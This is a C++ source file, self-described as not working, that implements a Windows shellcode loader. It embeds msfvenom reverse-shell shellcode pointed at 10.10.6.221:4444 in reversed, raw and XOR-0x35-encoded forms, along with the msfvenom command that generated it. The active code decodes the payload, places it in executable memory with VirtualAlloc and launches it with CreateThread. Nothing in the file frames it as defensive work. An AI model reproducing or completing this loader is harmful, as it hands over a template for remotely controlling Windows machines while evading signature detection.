// not working

#include <Windows.h>
#include <iostream>
#include <algorithm>


using namespace std;


void arrRev(char arr1[], int size_of_arr) {
	int i, j;
	char temp;

	j = size_of_arr - 1;

	for (i = 0; i < j; i++, j--) {
		temp = arr1[i];
		arr1[i] = arr1[j];
		arr1[j] = temp;
	}

}


int main() {
	/*
	msfvenom - p windows / shell_reverse_tcp LHOST = 10.10.6.221 LPORT = 4444 - f c
		[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
		[-] No arch selected, selecting arch : x86 from the payload
		No encoder specified, outputting raw payload
		Payload size : 324 bytes
		Final size of c file : 1386 bytes
	*/

	// reversed shellcode

	/*
	unsigned char buf_rev[] =
		"5dx\ffx\35x\00x\a6x\f6x\27x\31x\74x\bbx\50x\57x\0ex\bfx\08x\a0x\c7x\60x\c3x\5dx\ffx\d9x\dbx\59x\6ax\86x\65x\2ax\5bx\0fx\bbx\5dx\ffx\06x\d1x\78x\80x\86x\03x\ffx\64x\65x\e4x\0ex\98x\5dx\ffx\68x\f3x\ccx\97x\86x\65x\35x\65x\65x\e4x\65x\64x\65x\65x\65x\05x\45x\44x\00x\6cx\01x\42x\44x\d8x\10x\10x\c3x\42x\44x\7cx\66x\dfx\2ex\65x\95x\21x\a6x\6fx\13x\75x\75x\75x\3ex\98x\00x\46x\d6x\36x\86x\5dx\ffx\65x\2ax\5bx\0fx\86x\cex\57x\80x\e4x\ffx\c0x\47x\0cx\58x\5dx\ffx\16x\47x\5ax\99x\86x\75x\65x\01x\a6x\6ex\98x\c5x\11x\00x\20x\86x\ddx\60x\a0x\a0x\86x\50x\a6x\79x\5dx\ffx\0ex\fdx\f0x\aex\86x\05x\04x\05x\04x\05x\05x\05x\05x\5dx\ffx\00x\b6x\08x\92x\86x\05x\45x\4cx\92x\00x\00x\10x\09x\8bx\5dx\ffx\70x\62x\77x\c4x\86x\45x\f5x\23x\37x\77x\86x\00x\00x\23x\33x\86x\d5x\d8x\bex\21x\b8x\a5x\f5x\f5x\0ex\ffx\15x\a5x\95x\16x\b5x\b5x\42x\42x\44x\98x\0dx\10x\b8x\40x\b8x\3dx\10x\c1x\85x\b8x\b4x\c0x\b8x\66x\3dx\10x\42x\85x\b8x\85x\4ex\57x\42x\d7x\b3x\8fx\d7x\30x\6fx\57x\0ex\83x\7cx\10x\d0x\fcx\1cx\cax\ffx\13x\6dx\10x\b8x\43x\b8x\94x\a3x\3ex\81x\94x\b8x\3dx\10x\02x\95x\b8x\15x\1dx\10x\84x\3ex\87x\11x\c4x\b8x\c3x\a4x\b8x\01x\25x\b8x\75x\25x\2fx\2ex\7cx\10x\d0x\fcx\1cx\02x\c2x\20x\c7x\16x\c3x\cax\ffx\13x\62x\a4x\7bx\f0x\82x\27x\b8x\41x\25x\b8x\c0x\25x\b8x\03x\05x\b8x\46x\0cx\13x\5ex\98x\06x\00x\00x\00x\28x\8ex\cfx\";
	arrRev((char*)buf_rev, sizeof buf_rev);

	cout << "\n after arrrev\n";

	cout << " " << 0 << " " << buf_rev[0];
	cout << " " << 1 << " " << buf_rev[1];
	cout << " " << 2 << " " << buf_rev[2];
	cout << " " << 3 << " " << buf_rev[3];
	cout << " " << 4 << " " << buf_rev[4];

	//for (int i = 0; i < sizeof buf_rev; i++) {
	//	cout << buf_rev[i];
	//}

	cout << "\nsizeof buf_rev: " << sizeof buf_rev << "\n";
	
	*/
	
	/*
	unsigned char buf_rev[] =
			"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x06\xdd\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
	*/
	unsigned char buf_rev[] = "\xc9\xdd\xb7\x35\x35\x35\x55\xbc\xd0\x4\xf5\x51\xbe\x65\x5\xbe\x67\x39\xbe\x67\x21\xbe\x47\x1d\x3a\x82\x7f\x13\x4\xca\x99\x9\x54\x49\x37\x19\x15\xf4\xfa\x38\x34\xf2\xd7\xc7\x67\x62\xbe\x67\x25\xbe\x7f\x9\xbe\x79\x24\x4d\xd6\x7d\x34\xe4\x64\xbe\x6c\x15\x34\xe6\xbe\x7c\x2d\xd6\xf\x7c\xbe\x1\xbe\x34\xe3\x4\xca\x99\xf4\xfa\x38\x34\xf2\xd\xd5\x40\xc3\x36\x48\xcd\xe\x48\x11\x40\xd1\x6d\xbe\x6d\x11\x34\xe6\x53\xbe\x39\x7e\xbe\x6d\x29\x34\xe6\xbe\x31\xbe\x34\xe5\xbc\x71\x11\x11\x6e\x6e\x54\x6c\x6f\x64\xca\xd5\x6a\x6a\x6f\xbe\x27\xde\xb8\x68\x5d\x6\x7\x35\x35\x5d\x42\x46\x7\x6a\x61\x5d\x79\x42\x13\x32\xca\xe0\x8d\xa5\x34\x35\x35\x1c\xf1\x61\x65\x5d\x1c\xb5\x5e\x35\xca\xe0\x65\x65\x65\x65\x75\x65\x75\x65\x5d\xdf\x3a\xea\xd5\xca\xe0\xa2\x5f\x30\x5d\x3f\x3f\x33\xe8\x5d\x37\x35\x24\x69\xbc\xd3\x5f\x25\x63\x62\x5d\xac\x90\x41\x54\xca\xe0\xb0\xf5\x41\x39\xca\x7b\x3d\x40\xd9\x5d\xc5\x80\x97\x63\xca\xe0\x5d\x56\x58\x51\x35\xbc\xd6\x62\x62\x62\x4\xc3\x5f\x27\x6c\x63\xd7\xc8\x53\xf2\x71\x11\x9\x34\x34\xb8\x71\x11\x25\xf3\x35\x71\x61\x65\x63\x63\x63\x73\x63\x7b\x63\x63\x66\x63\x5d\x4c\xf9\xa\xb3\xca\xe0\xbc\xd5\x7b\x63\x73\xca\x5\x5d\x3d\xb2\x28\x55\xca\xe0\x8e\xc5\x80\x97\x63\x5d\x93\xa0\x88\xa8\xca\xe0\x9\x33\x49\x3f\xb5\xce\xd5\x40\x30\x8e\x72\x26\x47\x5a\x5f\x35\x66\xca\xe0";
	printf("\n%X", buf_rev[0] + 1);
	cout << sizeof buf_rev[0];
	cout << "\n" << 1 << " " << buf_rev[1];
	cout << "\n" << 2 << " " << buf_rev[2];
	cout << "\n" << 3 << " " << buf_rev[3];
	cout << "\n" << 4 << " " << buf_rev[4];

	for (int i = 0; i < sizeof buf_rev; i++) {
		buf_rev[i] = buf_rev[i] ^ '\x35';
		cout << buf_rev[i];
	}

	return 0;
	/*
		LPVOID VirtualAlloc(
	  [in, optional] LPVOID lpAddress,
	  [in]           SIZE_T dwSize,
	  [in]           DWORD  flAllocationType,
	  [in]           DWORD  flProtect
	);*/

	cout << "\nsize of buf: " << sizeof buf_rev;

	LPVOID shellcode_exec = VirtualAlloc(0, sizeof buf_rev, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	/*
	   void RtlCopyMemory(
	   void*       Destination,
	   const void* Source,
	   size_t      Length
	);
	*/

	RtlCopyMemory(shellcode_exec, buf_rev, sizeof buf_rev);

	//arrRev( (char*)shellcode_exec, sizeof buf);

	DWORD threadId;

	for (int i = 0; i < sizeof shellcode_exec; i++) {
		((char*)shellcode_exec)[i] = (((char*)shellcode_exec)[i]) ^ '\x35';
	}

	/*
	HANDLE CreateThread(
	[in, optional] LPSECURITY_ATTRIBUTES   lpThreadAttributes,
		[in]            SIZE_T                  dwStackSize,
		[in]            LPTHREAD_START_ROUTINE  lpStartAddress,
		[in, optional]  __drv_aliasesMem LPVOID lpParameter,
		[in]            DWORD                   dwCreationFlags,
		[out, optional] LPDWORD                 lpThreadId
		);
	*/

	cout << "\n" << shellcode_exec;
	getchar();

	HANDLE hthread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadId);
	WaitForSingleObject(hthread, INFINITE);


	return 0;

}